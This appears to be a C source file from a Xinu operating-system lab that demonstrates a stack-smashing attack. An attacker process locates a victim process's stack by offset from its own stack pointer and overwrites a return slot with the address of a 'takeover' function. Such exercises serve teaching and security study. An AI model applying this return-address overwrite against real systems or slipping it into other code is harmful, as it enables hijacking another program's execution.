/* stacksmashA.c - stacksmash */

#include <xinu.h>

void stacksmashA()
{

	kprintf("Attacker: Address of takeover:  0x%08X\n", takeover);
	kprintf("Attacker: Address of takeover:  0x%08X\n", &takeover);


	long attackerESPAddress;

	asm(
		"movl %%esp, %0;"
		: "=r" (attackerESPAddress)
	);

	kprintf("Attacker: Address of attacker runtime stack base:  0x%08X\n", attackerESPAddress);
	kprintf("Attacker: Address of victim   runtime stack base:  0x%08X\n", attackerESPAddress - 1024);

	long victimESPAddress = attackerESPAddress - 1024;

	kprintf("Attacker: Address of sleepms  runtime stack base:  0x%08X\n", victimESPAddress);

	unsigned long* pt =  victimESPAddress;

	*(pt-1) = takeover;

}
